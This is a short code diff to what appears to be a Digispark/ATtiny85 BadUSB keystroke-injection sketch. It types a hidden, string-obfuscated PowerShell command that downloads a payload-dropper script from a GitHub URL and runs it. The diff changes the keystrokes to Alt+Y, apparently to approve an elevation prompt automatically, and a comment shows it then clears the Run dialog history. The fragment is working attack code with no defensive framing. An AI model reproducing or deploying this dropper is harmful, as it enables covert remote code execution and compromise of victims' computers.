@@ -12,8 +12,9 @@ void setup() {
   DigiKeyboard.delay(500);
   DigiKeyboard.println("powershell -windowstyle hidden -nop \"IEX (N'ew'-Ob'j'ect Sy's'tem.Net.WebClient).DownloadString('https://raw.githubusercontent.com/sajithgairuka/Attiny85-Attcks/main/Payload_dropper/pd.txt');\"");
   DigiKeyboard.delay(9000);
-  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT );
-  DigiKeyboard.sendKeyStroke(KEY_ENTER );
+  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
+  //DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT );
+  //DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(5000);
 
   // clean up the run dialog history
